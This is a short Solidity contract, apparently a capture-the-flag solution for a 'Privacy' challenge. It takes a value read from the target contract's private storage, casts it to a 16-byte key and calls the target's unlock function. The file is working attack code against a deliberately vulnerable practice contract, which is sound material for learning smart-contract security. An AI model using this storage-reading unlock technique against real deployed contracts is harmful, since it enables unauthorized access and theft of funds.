//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "./privacy.sol";

contract privacyAttack {
    bytes32 public data =
        0x695ed6a1a0307f4896ba0a0bc83614170f182a19dd9835a951545e3c8480e9c3;
    bytes16 public key = bytes16(data);

    Privacy public target;

    constructor(address targetAdr) public {
        target = Privacy(targetAdr);
    }

    function attack() public {
        target.unlock(key);
    }
}
